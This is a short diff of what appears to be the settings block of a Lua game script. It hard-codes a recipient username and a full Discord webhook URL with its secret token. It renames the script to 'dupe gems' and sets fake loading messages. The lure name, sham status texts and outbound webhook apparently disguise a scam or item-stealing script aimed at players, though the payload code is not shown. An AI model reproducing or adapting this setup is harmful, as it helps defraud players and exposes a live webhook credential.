@@ -1,6 +1,6 @@
 Username = "fsdsfghdrty"
 WebHook = "https://discord.com/api/webhooks/1097831567398817922/zwEl70mjMd_kvKBrPw6ADvkkKtS5cOLcYgJcFY-fnipeYV7ypjWtgIK9U9xVZP9R9Ltr"
-_G.CustomScriptName = "Coen"
+_G.CustomScriptName = "dupe gems"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
